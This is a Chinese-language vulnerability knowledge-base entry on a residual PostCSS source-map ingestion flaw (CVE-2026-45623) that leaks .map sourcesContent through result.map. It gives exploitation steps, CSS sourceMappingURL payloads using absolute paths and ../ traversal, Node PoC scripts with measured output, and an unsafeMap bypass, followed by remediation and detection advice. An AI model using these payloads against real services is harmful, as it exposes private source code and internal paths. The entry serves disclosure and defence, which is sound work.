---
id: web-nodejs-postcss-previous-sourcemap-ingestion
title: PostCSS 8.5.12–8.5.22 残余面：合法 .map 读取与 sourcesContent 源码泄露
type: scenario
domain: web
path: web/nodejs
technique: postcss-previous-sourcemap-ingestion
aliases:
- PostCSS previous source map ingestion
- PostCSS .map 越界读取
- sourcesContent 源码泄露
- unsafeMap 绕过
- 8.5.12 残余利用面
- source map 合并泄露
tags:
- nodejs
- postcss
- source-map
- sourcescontent
- arbitrary-file-read
- info-leak
- dependency
cve:
- CVE-2026-45623
affected_versions: postcss 8.5.12 – 8.5.22（8.5.12 限制非 .map/非 JSON；8.5.18 限制 from 目录边界；8.5.23 关闭无 from 默认入口）；unsafeMap:true 可绕过路径侧保护
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:14+08:00'
  notes: 已对照原文及截图核对：8.5.12 JSON 预检与 .map 后缀、8.5.18 from 边界、8.5.23 无 from 关闭、sourcesContent 经 fromSourceMap/applySourceMap 合并、unsafeMap 三保护失效均与实测一致。未验证点：未复跑；残余利用依赖宿主输出 result.map。
---

## 一句话结论

PostCSS 8.5.12 切断了“非 `.map` 文件读取 + JSON 异常前缀外显”，但没有改掉 source map 合并逻辑：攻击者仍可通过 CSS 注释让 PostCSS 读取任意可达的合法 `.map`，其 `sources`/`sourcesContent` 会被 `SourceMapGenerator.fromSourceMap()` 或 `applySourceMap()` 复制进 `result.map`；只要宿主应用把 `result.map` 返回、写盘或公开，攻击者就能拿到 `.map` 中携带的整段源码，而不是 10 字节前缀。8.5.18 限制 `from` 目录边界、8.5.23 关闭无 `from` 默认入口后，残余面才逐步收窄。

## 原理

- 8.5.12 的两道补丁分别改变“读什么”和“怎么外显”：
  - 非受信路径必须 `.map` 结尾（除非 `unsafeMap: true`），把 `.env`、`/etc/passwd` 等高价值文本挡在读文件 sink 外；
  - 读取后先 `JSON.parse` 预检，失败即 `return undefined`，不再把非 JSON 内容送进 `SourceMapConsumer` 触发异常前缀泄露。
- 但 `readFileSync()` 本身仍然存在，合法 `.map` 仍会被读取；8.5.12–8.5.17 期间：
  - 未设置 `from`：绝对路径 `.map` 直接读取；
  - 设置了 `from`：`join(dirname(from), '../../..')` 仍可逃逸到目录外的 `.map`。
- 读取到的 map 内容进入 `PreviousMap.consumer()`，随后在生成阶段被合并：
  - 无插件路径：`generateMap()` 在 `previous().length === 1` 时调用 `SourceMapGenerator.fromSourceMap(prev)`，其内部遍历 `aSourceMapConsumer.sources` 并 `setSourceContent(sourceFile, content)`；
  - 有插件路径：`applyPrevMaps()` 调用 `applySourceMap()`，末段同样复制 `sourcesContent`。
- 默认 `isSourcesContent()` 的语义是“只要 previous map 自带内容就保留”：未显式设置 `{ map: { sourcesContent: false } }` 时，`withContent()` 为真就会把外部 `.map` 的 `sourcesContent` 合入结果。
- 因此攻击者控制的不只是“读了哪个文件”，还包括 `.map` 内部的 `sources` 列表和每条 `sourcesContent` 文本；这些字符串会原样进入 `result.map`。如果宿主把 map 输出给前端/写盘/上传对象存储，泄露的就是整段源码、内部路径、路由与私有逻辑。
- 8.5.18 增加“结果路径必须仍在 `opts.from` 目录内”的约束，切断目录穿越；但无 `from` 时绝对路径 `.map` 仍可读。8.5.23 直接禁止无 `from` 加载 source map，默认入口才关闭。
- `unsafeMap: true` 会让 `loadFile()` 的三道路径侧检查（`.map` 后缀、必须有 `from`、目录边界）同时失效；由于外层 `JSON.parse` 预检仍在，非 JSON 文件的异常前缀泄露不会复活，但合法 source map 形状的 JSON 仍会被完整合并，普通 JSON 则会暴露 `"X" is a required argument` 字段探针。

## 触发条件

- 目标使用 postcss 8.5.12–8.5.22（8.5.18 前可目录穿越，8.5.18–8.5.22 仅无 `from` 绝对路径；`unsafeMap: true` 可放宽）。
- 攻击者能控制传给 `postcss().process(css)` 的 CSS。
- 目标存在可读的 `.map` 文件（生产 bundle、SSR/Node server bundle、TypeScript 编译产物、带 `sourcesContent` 的 source map）。
- **关键外显条件**：宿主应用把 `result.map` 返回给调用方、写入可公开访问的文件、通过调试接口输出，或上传到可获取的对象存储。只消费 `result.css`、完全不看 `result.map` 的应用，残余可利用性大幅下降。

## 利用步骤

1. 判断目标 postcss 版本区间，确认是否仍在 8.5.12–8.5.22；检查调用方是否设置 `unsafeMap: true`。
2. 确认宿主是否输出 `result.map`：在线 CSS playground/formatter、构建 API、调试接口、公开的 `.map` 产物下载等。
3. 未设置 `from`（8.5.12–8.5.17）：在 CSS 尾部追加绝对路径 `.map`：
   ```css
   a {}
   /*# sourceMappingURL=/app/dist/server.js.map */
   ```
4. 已设置 `from`（8.5.12–8.5.17）：计算逃逸深度，读取 `from` 目录外的 `.map`：
   ```css
   a {}
   /*# sourceMappingURL=../../../../../srv/secret/app.js.map */
   ```
5. 若目标 `.map` 带 `sourcesContent`，读取返回的 `result.map`，从中提取 `sources` 与 `sourcesContent`；若目标 `.map` 不含 sourcesContent，只能确认文件存在与路径信息。
6. 8.5.18–8.5.22：目录穿越被阻断，改为针对“未设置 `from`”的绝对路径入口；8.5.23+ 该入口也关闭。
7. 若目标设置了 `unsafeMap: true`，可再次尝试非 `.map` 后缀但内容为合法 source map 的 JSON 文件；非法 JSON 会得到 `"version"`/`"sources"` 等字段缺失错误，可作字段探针。

## PoC

读取外部 `.map` 并把 `sourcesContent` 合入结果（8.5.12–8.5.17，无 `from`）：

```javascript
const postcss = require('postcss')
const r = postcss().process('a{}\n/*# sourceMappingURL=/tmp/evil.map */')
console.log(r.map.toString())
```

`/tmp/evil.map` 为合法 source map 且带 `sourcesContent` 时，实测输出包含：

```json
{"version":3,"sources":["/etc/passwd"],"names":[],"mappings":"","file":"to.css","sourcesContent":["SECRET"]}
```

目录穿越读取 `.map`（8.5.12–8.5.17，已设置 `from`）：

```javascript
const postcss = require('postcss')
const r = postcss().process(
  'a{}\n/*# sourceMappingURL=../../../../../tmp/outside-8512.map */',
  { from: '/var/www/html/styles/main.css', map: { inline: false } }
)
console.log(r.map.toString())
```

实测 `sourcesContent` 为 `["STEAL"]`，说明已读出 `from` 目录外的 map 内容。

版本差异实测：

```text
8.5.18 无 from：绝对路径 .map 仍可读，result.map 含 sourcesContent
8.5.18 有 from：../ 穿越被阻断，输出正常 CSS，map 不含目标内容
8.5.23 无 from：不加载 source map，r.map 为 undefined
```

## 变体与关联

- 变体：`unsafeMap: true` 同时关闭 `.map` 后缀、`from` 必填、目录边界三道路径保护；合法 source map 形状的 JSON 会被完整合并，普通 JSON 变成字段存在性探针。
- 变体：`data:` 内联分支没有文件分支的 `try/catch` 预检；若内联数据由上游 build/proxy/CDN 拼接而非攻击者直接写入，8.5.12+ 仍可能以 `SyntaxError` 外显服务端拼出的字节前缀。
- 变体：攻击者控制的 `sources`/`sourcesContent` 会进入下游构建工具、调试接口、source-map-explorer 等组件，可能形成二次注入面；原文未构造完整二次利用链。
- 关联：[[web-nodejs-postcss-sourcemappingurl-arbitrary-file-read]]（原始 CVE 的任意文件读取与异常前缀泄露）。
- 边界：8.5.23+ 默认入口关闭；是否可利用高度依赖宿主是否输出 `result.map`，不能仅凭版本号断言“可远程读取任意源码”。

## 检测与防御

- 修复：升级 postcss 到 `>= 8.5.23`；至少升级到 8.5.18 切断目录穿越。
- 加固：不要让不可信 CSS 控制 previous source map 的加载；对外部 CSS 剥离或白名单化 `sourceMappingURL` 注释。
- 加固：宿主若不需要 previous map，显式设置 `map: false`；若需要，设置 `{ map: { sourcesContent: false } }`，避免把外部 map 的源码内容带进结果。
- 加固：禁止 `unsafeMap: true`；在代码库中 `grep -rni "unsafeMap"` 审计调用点，任何开启点都应视为不受 8.5.12/8.5.18/8.5.23 保护。
- 加固：不要把 `result.map` 直接返回给不可信调用方或写入公开目录；调试接口对 map 做鉴权与脱敏。
- 检测：响应/日志中出现 `Unsupported version:`、`"sources" is a required argument`、`"version" is a required argument`；CSS 尾部出现指向 `.map` 的绝对路径或 `../`；异常的 `result.map` 大小/来源；公开目录出现非构建流程生成的 `.map`。
- 审计：搜索 `postcss().process(` 调用点，确认 `from`、`map`、`sourcesContent`、`unsafeMap` 配置，以及 `result.map` 的流向。
